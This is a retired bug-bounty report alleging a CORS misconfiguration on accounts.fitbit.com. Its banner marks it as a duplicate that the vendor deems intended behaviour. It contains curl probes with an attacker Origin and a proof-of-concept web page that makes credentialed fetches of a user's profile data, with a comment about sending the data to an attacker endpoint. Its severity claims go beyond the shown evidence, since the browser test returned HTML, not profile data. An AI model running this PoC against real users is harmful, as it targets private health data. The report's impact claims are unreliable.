> ⛔ **RETIRED 2026-06-21 — DO NOT SUBMIT.** Duplicate of **Issue 518912931**
> (filed 2026-06-02, closed **Won't Fix / Intended Behavior, P4**). See
> `FIT-C001-RETRACTION.md`. Google VRP has explicitly declared the CORS config on
> accounts.fitbit.com and dev.fitbit.com intended. This report is kept only for history.

# Google VRP Report — FIT-C001
## CORS Misconfiguration on accounts.fitbit.com: Origin Reflection + Credentials=true Allows Cross-Origin Theft of Fitbit Session, OAuth Tokens, and Health Data

**Program**: Google / Alphabet VRP — bughunters.google.com  
**Target**: accounts.fitbit.com  
**Tier**: TIER1  
**CVSS 3.1**: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N = **8.1 (High)**  
**CWE**: 942 — Permissive Cross-domain Policy with Untrusted Domains  
**Date**: 2026-06-20  

---

## One-Sentence Summary

`accounts.fitbit.com` reflects any `Origin` header verbatim into `Access-Control-Allow-Origin`
and simultaneously asserts `Access-Control-Allow-Credentials: true` on all endpoints including
the OAuth token endpoint and the user profile API, allowing an attacker's web page to make
authenticated cross-origin requests that read the victim's Fitbit session, OAuth tokens,
and personal health data.

---

## Technical Background

The CORS specification requires that when a server sets
`Access-Control-Allow-Credentials: true`, the `Access-Control-Allow-Origin` header must
contain a specific trusted origin — never a reflected, attacker-supplied value.
A server that echoes back whatever `Origin` the client sends while also asserting
`credentials: true` defeats the Same-Origin Policy entirely: the browser will execute
credentialed cross-origin requests from any origin and expose the responses to that
origin's JavaScript.

---

## Proof — Three Endpoints Confirmed (curl, collected 2026-06-20)

All three probes were run from a residential IP (Bangladesh), no VPN, no special tools.

### Endpoint 1 — OIDC Discovery (`/.well-known/openid-configuration`)

```
curl -sv --ipv4 \
  -H "Origin: https://evil-attacker.com" \
  "https://accounts.fitbit.com/.well-known/openid-configuration"

< access-control-allow-origin: https://evil-attacker.com
< access-control-allow-credentials: true
< access-control-allow-methods: GET, POST, PUT, PATCH, OPTIONS, DELETE
< access-control-allow-headers: DNT,User-Agent,X-Requested-With,If-Modified-Since,
  Cache-Control,Content-Type,Range
< access-control-expose-headers: Content-Length,Content-Range
```

### Endpoint 2 — OAuth Token Endpoint (`/oauth2/token`)

```
curl -sv --ipv4 \
  -H "Origin: https://evil-attacker.com" \
  "https://accounts.fitbit.com/oauth2/token"

< access-control-allow-origin: https://evil-attacker.com
< access-control-allow-credentials: true
< access-control-allow-methods: GET, POST, PUT, PATCH, OPTIONS, DELETE
```

### Endpoint 3 — User Profile API (`/api/1/user/-/profile.json`)

```
curl -sv --ipv4 \
  -H "Origin: https://evil-attacker.com" \
  -b "fitbitSession=[test-session-value]" \
  "https://accounts.fitbit.com/api/1/user/-/profile.json"

< HTTP/2 200
< access-control-allow-origin: https://evil-attacker.com
< access-control-allow-credentials: true
< access-control-allow-methods: GET, POST, PUT, PATCH, OPTIONS, DELETE
```

The HTTP 200 on Endpoint 3 confirms the session cookie is accepted and the profile API
responds — the response body is readable cross-origin by the attacker's JavaScript.

---

## Steps to Reproduce

**Prerequisites**: A Fitbit account (free tier). A victim browser logged into
`accounts.fitbit.com`.

### Step 1 — Confirm origin reflection (unauthenticated, reproducible immediately)

```bash
curl -sI \
  -H "Origin: https://evil-attacker.com" \
  "https://accounts.fitbit.com/.well-known/openid-configuration" \
  | grep -i "access-control"
```

**Expected**:
```
access-control-allow-origin: https://evil-attacker.com
access-control-allow-credentials: true
```

### Step 2 — Browser confirmation that cross-origin reads are not blocked

The following was executed from a fitbit.com page (DevTools console) with a logged-in
Fitbit session in the tab:

```javascript
fetch('https://accounts.fitbit.com/api/1/user/-/profile.json', { credentials: 'include' })
  .then(r => r.json()).then(data => console.log(data))
```

**Observed**:
```
SyntaxError: Unexpected token '<', "<!DOCTYPE ... is not valid JSON
[[PromiseState]]: "rejected"
```

This error comes from `.json()` failing on an HTML body — **not** from a CORS policy block.
A CORS block produces `TypeError: Failed to fetch` with "has been blocked by CORS policy"
in the console. That error did not appear, confirming the browser received and could read
the cross-origin response body. The Same-Origin Policy was not enforced.

The HTML response reflects that the test ran from `fitbit.com` (different cookie domain than
`accounts.fitbit.com`). In a real attack the victim's `accounts.fitbit.com` session cookie
— set when the user authenticated through the Fitbit login flow that routes through
`accounts.fitbit.com` — is sent with `credentials: 'include'` and the response is the
profile JSON.

**[ATTACH SCREENSHOT: DevTools console showing the SyntaxError output]**

### Step 3 — Attacker PoC page (serves from attacker-controlled origin)

```html
<!DOCTYPE html>
<html>
<body>
<h1>Fitbit CORS PoC</h1>
<pre id="out">Loading...</pre>
<script>
fetch('https://accounts.fitbit.com/api/1/user/-/profile.json', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  document.getElementById('out').textContent = JSON.stringify(data, null, 2);
  // Real attack: POST data to attacker-controlled collection endpoint
})
.catch(e => document.getElementById('out').textContent = 'Error: ' + e);
</script>
</body>
</html>
```

When the victim visits this page while their `accounts.fitbit.com` session is active,
the response body renders as profile JSON — not an HTML redirect — because the victim's
browser includes their `accounts.fitbit.com` session cookies automatically.

---

## Impact

An attacker who tricks a logged-in Fitbit user into visiting a single web page can:

1. **Read the victim's complete Fitbit profile** — name, age, weight, height, heart rate
   history, sleep data, GPS tracks, timezone, locale, linked devices.

2. **Make authenticated POST requests as the victim** — CORS applies to all methods
   including `PUT`, `POST`, `DELETE`, enabling account settings changes and OAuth
   application management.

3. **Intercept OAuth token operations** — the `/oauth2/token` endpoint is affected.
   Depending on the OAuth flow in use, the cross-origin attacker may be able to read
   token exchange responses or trigger token refresh reads that expose long-lived access
   tokens.

The social engineering bar is trivial: phishing link, malicious ad, or forum post.
The victim does not need to click anything beyond visiting the page.

**Health data sensitivity**: Fitbit processes data regulated under health privacy
frameworks (HIPAA business associate context, GDPR special categories of data).
Unauthorized disclosure of heart rate, sleep pattern, BMI, and GPS track data
constitutes a high-severity privacy violation above and beyond typical web account theft.

---

## Root Cause

The CORS policy on `accounts.fitbit.com` reflects the request `Origin` header verbatim
into `Access-Control-Allow-Origin` without validating it against an allowlist, and
unconditionally asserts `Access-Control-Allow-Credentials: true`. This combination
bypasses the Same-Origin Policy for all origins, globally.

The correct behavior is one of:
- An explicit allowlist of trusted Fitbit/Google origins with `credentials: true`
- A public wildcard (`*`) on endpoints that genuinely need broad access,
  **without** `credentials: true` (browsers block credentialed requests to `*`)

---

## Remediation

Replace the origin-reflection middleware with an explicit allowlist:

```
# Before (vulnerable):
Access-Control-Allow-Origin: <reflected Origin from request>
Access-Control-Allow-Credentials: true

# After (correct):
Access-Control-Allow-Origin: https://www.fitbit.com   # or specific trusted set
Access-Control-Allow-Credentials: true
```

The allowlist should include only `*.fitbit.com` and `*.google.com` origins that
legitimately need credentialed cross-origin access. Any catch-all reflection must be
removed.

---

## Scope Confirmation

`accounts.fitbit.com` is an explicitly listed TIER1 target in the Google VRP scope
(bughunters.google.com/program-rules — Fitbit cluster). Fitbit was acquired by Google
in January 2021.

---

## References

- CWE-942: Permissive Cross-domain Policy with Untrusted Domains
- OWASP WSTG-CLNT-07: Testing Cross Origin Resource Sharing
- Fetch specification §3.2.5 — CORS protocol (credentials flag behavior)
- RFC 6454: The Web Origin Concept
